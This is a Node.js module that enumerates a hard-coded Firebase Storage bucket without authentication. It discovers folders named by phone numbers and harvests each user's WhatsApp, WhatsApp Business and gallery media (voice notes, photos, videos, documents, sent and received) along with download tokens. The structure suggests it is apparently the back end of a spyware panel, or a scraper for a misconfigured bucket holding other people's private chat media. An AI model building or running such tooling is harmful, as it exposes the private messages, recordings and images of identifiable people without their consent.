const https = require("https");

const BUCKET = "pulse-82887.firebasestorage.app";
const BASE = `https://firebasestorage.googleapis.com/v0/b/${BUCKET}/o`;

// File extensions by category
const IMAGE_EXTS = [".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".heic", ".heif"];
const VIDEO_EXTS = [".mp4", ".3gp", ".mkv", ".avi", ".mov", ".wmv", ".flv", ".webm"];
const DOC_EXTS = [".pdf", ".docx", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".csv", ".rtf", ".zip", ".rar"];
const VOICE_EXTS = [".opus", ".aac"];
const AUDIO_EXTS = [".mp3", ".m4a", ".wav", ".ogg", ".aac", ".flac"];

function getExtension(name) {
  const clean = name.split("?")[0];
  const dot = clean.lastIndexOf(".");
  return dot >= 0 ? clean.substring(dot).toLowerCase() : "";
}

function isImage(name) { return IMAGE_EXTS.includes(getExtension(name)); }
function isVideo(name) { return VIDEO_EXTS.includes(getExtension(name)); }
function isDocument(name) { return DOC_EXTS.includes(getExtension(name)); }
function isVoice(name) { return VOICE_EXTS.includes(getExtension(name)); }
function isAudio(name) { return AUDIO_EXTS.includes(getExtension(name)); }

function getDownloadUrl(filePath, token) {
  const encoded = encodeURIComponent(filePath);
  if (token) return `${BASE}/${encoded}?alt=media&token=${token}`;
  return `${BASE}/${encoded}?alt=media`;
}

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { timeout: 15000 }, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(null); }
      });
    }).on("error", reject).on("timeout", () => reject(new Error("timeout")));
  });
}

// Fetch download token for a single file
async function fetchDownloadToken(filePath) {
  try {
    const encoded = encodeURIComponent(filePath);
    const meta = await fetchJSON(`${BASE}/${encoded}`);
    return meta && meta.downloadTokens ? meta.downloadTokens.split(",")[0] : null;
  } catch { return null; }
}

// Fetch tokens in parallel batches
async function fetchTokensBatch(filePaths) {
  const BATCH_SIZE = 20;
  const tokens = {};
  for (let i = 0; i < filePaths.length; i += BATCH_SIZE) {
    const batch = filePaths.slice(i, i + BATCH_SIZE);
    const results = await Promise.all(
      batch.map(async (fp) => ({ path: fp, token: await fetchDownloadToken(fp) }))
    );
    results.forEach((r) => { tokens[r.path] = r.token; });
  }
  return tokens;
}

// List files under a prefix (with pagination + download tokens)
async function listFiles(prefix, maxResults = 500) {
  let allItems = [];
  let pageToken = null;

  do {
    let url = `${BASE}?prefix=${encodeURIComponent(prefix)}&maxResults=${Math.min(maxResults - allItems.length, 1000)}`;
    if (pageToken) url += `&pageToken=${encodeURIComponent(pageToken)}`;
    const data = await fetchJSON(url);
    if (!data) break;
    if (data.items) allItems.push(...data.items);
    pageToken = data.nextPageToken || null;
  } while (pageToken && allItems.length < maxResults);

  const filePaths = allItems.map((item) => item.name);
  const tokens = await fetchTokensBatch(filePaths);

  return allItems.map((item) => ({
    name: item.name,
    fileName: item.name.split("/").pop().split("?")[0],
    path: item.name,
    bucket: item.bucket,
    downloadUrl: getDownloadUrl(item.name, tokens[item.name]),
    size: item.size ? parseInt(item.size) : 0,
    contentType: item.contentType || "",
    timeCreated: item.timeCreated || "",
    updated: item.updated || "",
  }));
}

// List subfolders under a prefix
async function listPrefixes(prefix) {
  const url = `${BASE}?prefix=${encodeURIComponent(prefix)}&delimiter=/&maxResults=1000`;
  const data = await fetchJSON(url);
  if (!data || !data.prefixes) return [];
  return data.prefixes;
}

// ==========================================
// NEW STRUCTURE: {phone}/WhatsApp/... etc
// ==========================================

// Discover all phone-number users (top-level folders starting with +)
async function discoverAllUsers() {
  const prefixes = await listPrefixes("");
  const phoneUsers = prefixes
    .map((p) => p.replace(/\/$/, ""))
    .filter((p) => p.startsWith("+") && p.length > 5);
  return phoneUsers.sort();
}

// Get top-level app folders for a user (WhatsApp, BusinessWhatsApp, gallery)
async function getUserApps(phone) {
  const prefixes = await listPrefixes(`${phone}/`);
  return prefixes.map((p) => {
    const parts = p.split("/").filter(Boolean);
    return parts[1] || "";
  }).filter(Boolean);
}

// Get media categories inside an app folder
async function getAppCategories(phone, app) {
  const prefixes = await listPrefixes(`${phone}/${app}/`);
  return prefixes.map((p) => {
    const parts = p.split("/").filter(Boolean);
    return parts[2] || "";
  }).filter(Boolean);
}

// Get Sent/Received sub-directions inside a category
async function getCategoryDirections(phone, app, category) {
  const prefixes = await listPrefixes(`${phone}/${app}/${category}/`);
  return prefixes.map((p) => {
    const parts = p.split("/").filter(Boolean);
    return parts[3] || "";
  }).filter(Boolean);
}

// Get files for a specific user, app, category, and optionally direction
// e.g. getUserCategoryFiles("+923...", "WhatsApp", "images", "Received")
async function getUserCategoryFiles(phone, app, category, direction = "all", maxResults = 500) {
  let prefix;
  if (direction && direction !== "all") {
    prefix = `${phone}/${app}/${category}/${direction}/`;
  } else {
    prefix = `${phone}/${app}/${category}/`;
  }
  return listFiles(prefix, maxResults);
}

// Get ALL files for a user organized by type (across WhatsApp + BusinessWhatsApp + gallery)
async function getUserAllFiles(phone) {
  const apps = await getUserApps(phone);
  const results = {
    voiceNotes: [], images: [], videos: [], documents: [], audio: [], gallery: [],
    byApp: { WhatsApp: {}, BusinessWhatsApp: {}, gallery: {} },
  };

  for (const app of apps) {
    if (app === "gallery") {
      const files = await listFiles(`${phone}/gallery/`, 500);
      results.gallery.push(...files);
      results.byApp.gallery = { files: files.length };
      // Also categorize gallery into images/videos
      for (const f of files) {
        if (isVideo(f.fileName)) results.videos.push(f);
        else results.images.push(f);
      }
    } else {
      const categories = await getAppCategories(phone, app);
      const appStats = {};
      for (const cat of categories) {
        const files = await listFiles(`${phone}/${app}/${cat}/`, 500);
        appStats[cat] = files.length;
        for (const f of files) {
          if (cat === "voiceNotes") results.voiceNotes.push(f);
          else if (cat === "images") results.images.push(f);
          else if (cat === "video") results.videos.push(f);
          else if (cat === "documents") results.documents.push(f);
          else if (cat === "audio") results.audio.push(f);
        }
      }
      results.byApp[app] = appStats;
    }
  }

  return results;
}

// Get user stats (file counts) without fetching all file data
async function getUserStats(phone) {
  const apps = await getUserApps(phone);
  const stats = {
    apps: [],
    voiceNotes: 0, images: 0, videos: 0, documents: 0, audio: 0, gallery: 0, totalFiles: 0,
  };

  for (const app of apps) {
    stats.apps.push(app);
    if (app === "gallery") {
      const files = await listFiles(`${phone}/gallery/`, 500);
      stats.gallery = files.length;
      stats.totalFiles += files.length;
    } else {
      const categories = await getAppCategories(phone, app);
      for (const cat of categories) {
        const files = await listFiles(`${phone}/${app}/${cat}/`, 500);
        const count = files.length;
        if (cat === "voiceNotes") stats.voiceNotes += count;
        else if (cat === "images") stats.images += count;
        else if (cat === "video") stats.videos += count;
        else if (cat === "documents") stats.documents += count;
        else if (cat === "audio") stats.audio += count;
        stats.totalFiles += count;
      }
    }
  }

  return stats;
}

// Get storage overview
async function getStorageOverview() {
  const allPrefixes = await listPrefixes("");
  const phoneUsers = allPrefixes.filter((p) => p.startsWith("+"));
  const otherFolders = allPrefixes.filter((p) => !p.startsWith("+"));
  return {
    bucket: BUCKET,
    totalUsers: phoneUsers.length,
    users: phoneUsers.map((p) => p.replace(/\/$/, "")),
    otherFolders: otherFolders.map((p) => p.replace(/\/$/, "")),
  };
}

function formatFileSize(bytes) {
  if (!bytes || bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + " " + sizes[i];
}

module.exports = {
  BUCKET, BASE,
  listFiles, listPrefixes, fetchJSON, getDownloadUrl,
  discoverAllUsers, getUserApps, getAppCategories, getCategoryDirections,
  getUserCategoryFiles, getUserAllFiles, getUserStats, getStorageOverview,
  formatFileSize, isImage, isVideo, isDocument, isVoice, isAudio, getExtension,
};
